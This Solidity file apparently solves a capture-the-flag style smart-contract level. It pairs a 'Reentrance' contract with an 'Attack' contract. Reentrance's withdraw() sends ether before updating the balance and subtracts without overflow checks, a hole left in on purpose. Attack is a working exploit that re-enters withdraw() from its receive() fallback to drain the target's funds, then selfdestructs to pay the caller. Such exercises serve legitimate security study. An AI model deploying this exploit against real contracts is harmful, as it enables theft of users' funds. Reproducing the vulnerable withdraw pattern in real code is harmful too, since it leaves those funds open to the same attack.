// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "openzeppelin-contracts-06/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.2/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attack {
    uint constant AMOUNT = 0.001 ether;

    function attack(Reentrance _target) external payable {
        require(msg.value == AMOUNT, "invalid msg.value");
        // donate to be able to withdraw something
        _target.donate{value: msg.value}(address(this));
        // start attack
        _target.withdraw(msg.value);
        // withdraw all funds after attack
        selfdestruct(msg.sender);
    }

    receive() external payable  {
        uint currentBalance = address(msg.sender).balance;
        if (currentBalance > 0) {
            Reentrance(msg.sender).withdraw(AMOUNT);
        }
    }
}